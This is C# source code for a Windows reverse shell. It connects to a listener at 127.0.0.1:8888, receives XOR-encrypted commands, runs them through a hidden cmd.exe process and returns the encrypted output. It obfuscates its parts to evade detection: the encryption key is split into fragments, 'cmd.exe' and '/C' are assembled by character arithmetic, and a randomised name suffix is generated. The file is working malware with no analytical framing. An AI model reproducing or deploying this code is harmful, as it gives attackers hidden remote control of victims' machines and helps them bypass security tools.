using System;
using System.Diagnostics;
using System.Linq;
using System.Management; 
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.Text;

namespace rev_shell
{
    class Program
    {	
		
	    
		
	
		static byte[] GetKey() 
        {
            
            string part1 = "Hel";  
            string part2 = "lo";  
            string part3 = "02W";  
            string part4 = "or";
            string part5 = "ld";  
            string part6 = "0d"; 			
            
             
            return Encoding.UTF8.GetBytes(part1 + part2 + part3 + part4 + part5 + part6);
        }
		
		
		
		const string RANDOM_SUFFIX = "ddaw23b3"; 
		static string res = "var_" + RANDOM_SUFFIX;
		
		
        
        static byte[] key = GetKey();

        static void Main(string[] args)
        {
		
			
			
			
			Random random = new Random();
			int r_num = random.Next(0,3110);
			string str = r_num.ToString();
			string full_res = res + str;
			//Console.WriteLine(full_res);
            
			
            string serverAddress = "127.0.0.1";
            int serverPort = 8888;

            try
            {
                using (TcpClient client = new TcpClient(serverAddress, serverPort))
                {
                    //Console.WriteLine("Connected to server.");

                    using (NetworkStream stream = client.GetStream())
                    {
                        byte[] buffer = new byte[4096];
                        while (true)
                        {
                            
                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
                            if (bytesRead == 0)
                            {
                                //Console.WriteLine("Server closed the connection.");
                                break;
                            }

                            
                            byte[] decryptedCtrl = Enx(buffer, bytesRead);
                            string ctrl = Encoding.UTF8.GetString(decryptedCtrl, 0, decryptedCtrl.Length).Trim();
                            //Console.WriteLine(String.Format("Received ctrl: {0}", ctrl));
		            Array.Clear(decryptedCtrl, 0, decryptedCtrl.Length);

                            
                            string output = E_ctrl(ctrl);

                            
                            byte[] encryptedResponse = Enx(Encoding.UTF8.GetBytes(output));
                            stream.Write(encryptedResponse, 0, encryptedResponse.Length);

		            byte[] outputBytes = Encoding.UTF8.GetBytes(output);
			    Array.Clear(outputBytes, 0, outputBytes.Length);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("Error: {0}", ex.Message));
            }
        }


	static string BuildString(int[] first, int[] delta1, int[] second, int[] delta2)
	{		
		var sb = new StringBuilder();
		for(int i=0; i<first.Length; i++) 
			sb.Append((char)(first[i] + delta1[i]));
		sb.Append('.');
		for(int i=0; i<second.Length; i++)
			sb.Append((char)(second[i] + delta2[i]));
		return sb.ToString();
	}

        static string E_ctrl(string ctrl)
        {
            try
            {
                Process temp = new Process(), pro = ((temp != null) ? temp : new Process());
		string fileName = BuildString(
			new[] { 99, 110, 130 }, 
			new[] { 0, -1, -30 }, 
			new[] { 116, 122, 112 }, 
			new[] { -15, -2, -11 }
		);
                pro.StartInfo.FileName = fileName;
                char slash = (char)47;
		char c = (char)67;
		char space = (char)32;
		string arguments = new string(new[] { slash, c, space }) + ctrl;
		pro.StartInfo.Arguments = arguments;
                pro.StartInfo.RedirectStandardOutput = true;
                pro.StartInfo.RedirectStandardError = true;
                pro.StartInfo.UseShellExecute = false;
                pro.StartInfo.CreateNoWindow = true;

                pro.Start();

                string output = pro.StandardOutput.ReadToEnd();
                string error = pro.StandardError.ReadToEnd();

                pro.WaitForExit();

                return string.IsNullOrEmpty(error) ? output : error;
            }
            catch (Exception ex)
            {
                return String.Format("Error executing : {0}", ex.Message);
            }
        }

        
        static byte[] Enx(byte[] data)
        {
            return Enx(data, data.Length);
        }

        static byte[] Enx(byte[] data, int length)
        {
            int keySize = key.Length;
            byte[] result = new byte[length];

            for (int i = 0; i < length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % keySize]);
            }

            return result;
        }
    }
}
